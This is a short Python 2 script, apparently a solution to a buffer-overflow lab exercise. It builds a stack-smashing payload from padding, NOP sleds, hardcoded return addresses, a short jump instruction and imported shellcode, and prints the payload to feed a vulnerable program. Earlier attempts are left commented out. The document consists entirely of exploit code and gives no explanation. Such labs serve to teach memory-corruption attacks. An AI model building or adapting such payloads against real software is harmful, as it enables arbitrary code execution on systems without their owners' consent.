#from shellcode import shellcode

#print '\x61'* 40 + '\x80\x37\x0f\x08' + '\x01\x01\xfe\xbf'  + '\n' + '\x61' * 40 + '\x80\x37\x0f\x08' + '\xec\x7e\xfe\xbf' + '\n' + '\xe9\x03\x01\x01' + '\x90\x90\x90\x90' +  shellcode

from shellcode import shellcode
print "abcd "+"\x90"*40+"\x80\x37\x0f\x08"+"\xec\x7e\xfe\xbf\n"+"\xeb"+"\x06"+"\x90"*6+shellcode

#print 'abc' + '\n' + 'abd '
